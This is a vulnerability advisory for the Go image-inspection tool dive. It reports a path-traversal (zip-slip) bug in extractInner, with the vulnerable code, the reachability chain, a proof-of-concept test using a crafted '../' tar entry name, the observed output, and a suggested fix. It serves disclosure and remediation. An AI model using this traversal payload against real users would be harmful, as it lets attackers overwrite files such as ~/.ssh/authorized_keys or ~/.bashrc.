# dive: path traversal in `extractInner` writes files outside the target on Extract (Ctrl+E)

**Package**: github.com/wagoodman/dive
**Ecosystem**: Go
**Affected versions**: tested at `d6c69194` (master, after v0.13.1)
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N` — **4.4**
**CWE**: CWE-22 (Path Traversal / Zip-Slip)

## Summary

dive's `extractInner` writes layer files to disk using the raw tar entry name
(`header.Name`) with no path sanitization. A malicious Docker image whose layer
contains an entry name with `..` components can write a file outside the intended
extraction directory when the user invokes the Extract action (Ctrl+E) on a file in
that layer. The safe `path.Clean` pattern already used elsewhere in the same file is
not applied on the write path.

## Affected code

`dive/dive/image/docker/image_archive.go` (note the nested module dir — the in-repo
path is `dive/dive/image/docker/...`, one level deeper than `image/docker/...`):

```go
// extractInner — line 337
func extractInner(reader *tar.Reader, p string) error {
    target := strings.TrimPrefix(p, "/")
    for {
        header, err := reader.Next()
        ...
        name := header.Name                       // line 352 — RAW, unsanitized
        ...
        if strings.HasPrefix(name, target) {      // line 356
            err := os.MkdirAll(filepath.Dir(name), 0755)  // line 357 — creates traversal dirs
            ...
            out, err := os.Create(name)           // line 362 — writes to traversal path
            ...
            _, err = io.Copy(out, reader)         // line 367 — attacker bytes written
```

The sibling analysis function `getFileList` does sanitize, proving the safe pattern
was known:

```go
// getFileList — line 233
name := path.Clean(header.Name)   // "always ensure relative path notations are not parsed as part of the filename"
```

## Reachability (confirmed live)

`extractInner` is the backend of the interactive "Extract File" action, not dead code:

```
key/config.go:97   ExtractFile -> "ctrl+e"
view/filetree.go   binds ExtractFile -> v.extractFile -> calls listeners with node.Path()
app/controller.go  onFileTreeViewExtract(p) -> Content.Extract(ctx, image, layerId, p)
docker/engine_resolver.go:56  Extract -> ExtractFromImage(...)
image_archive.go:303  ExtractFromImage -> extractInner(...)
```

## Proof of concept (reproduced against dive's real code)

A Go test in `package docker` builds a malicious image tar in memory and calls dive's
**real** functions — both the unexported `extractInner` and the exported
`ExtractFromImage` (the Ctrl+E backend). The malicious layer holds a benign entry
under `usr/bin/` (to pre-create the prefix dir that `os.MkdirAll` needs) followed by a
traversal entry:

```go
// malicious layer entries
ltw.WriteHeader(&tar.Header{Name: "usr/bin/hello", Size: ..., Typeflag: tar.TypeReg})         // benign
ltw.Write([]byte("#!/bin/sh\necho hello\n"))
ltw.WriteHeader(&tar.Header{Name: "usr/bin/hello/../../../../tmp/poc-review/dive-sentinel/dive-poc-pwned",
                            Size: ..., Typeflag: tar.TypeReg})                                  // traversal
ltw.Write([]byte("PWNED-BY-EXTRACTINNER"))
```

Run:

```
$ go test -run 'ZipSlip|NegativeControl|FixWouldNeutralize' -v ./dive/image/docker/
```

Observed:

```
TestExtractInner_ZipSlip        REPRODUCED: wrote /tmp/poc-review/dive-sentinel/dive-poc-pwned
                                = "PWNED-BY-EXTRACTINNER" (escaped working dir .../001)
TestExtractFromImage_ZipSlip    REPRODUCED (Ctrl+E backend): wrote /tmp/poc-review/dive-sentinel/dive-poc-pwned-e2e
                                = "PWNED-VIA-CTRL-E-PATH"
NegativeControl                 benign no-".." entry written INSIDE the work dir
FixWouldNeutralize              path.Clean + containment: sentinel NOT written
```

Both real entry points wrote the sentinel outside the working directory; `path.Clean`
plus a containment check (the suggested fix) neutralized it.

## Exploitation constraints (for accurate severity)

Three real conditions bound difficulty — none prevents the bug, but they lower it from
the "trivial remote" framing:

1. The traversal entry name must start with the selected node's path
   (`strings.HasPrefix(name, target)`), so the crafted name begins with the file the
   victim extracts, then escapes via `..`.
2. `os.MkdirAll(filepath.Dir(name))` walks the literal `..`, so a benign sibling entry
   must pre-create the prefix directory (trivial for an attacker controlling the layer).
3. The extract path reads the matched layer as an **uncompressed** `.tar` (no gzip),
   so the malicious layer must be uncompressed for the action to read it.

Combined with the need for the victim to (a) analyze an attacker-controlled image and
(b) manually press Ctrl+E on a specific node, this is `AC:H` + `UI:R`, local vector,
write-only impact — Medium, not the originally-stated High (CVSS 7.1 overstated AC/UI).

## Impact

A malicious image (public registry, supply-chain, or shared CI) can write arbitrary
files as the user analyzing it with dive: overwrite `~/.bashrc`, `~/.ssh/authorized_keys`,
cron entries, or binaries on `$PATH`. Write-only — no direct confidentiality impact.

## Suggested fix

Apply the same sanitization `getFileList` already uses, plus an explicit containment
check, before any `os.MkdirAll`/`os.Create`:

```go
name := path.Clean(header.Name)
if name == "." || strings.HasPrefix(name, "..") || strings.HasPrefix(name, "/") {
    continue
}
// optionally: resolve against the extraction root and verify the result stays within it
```
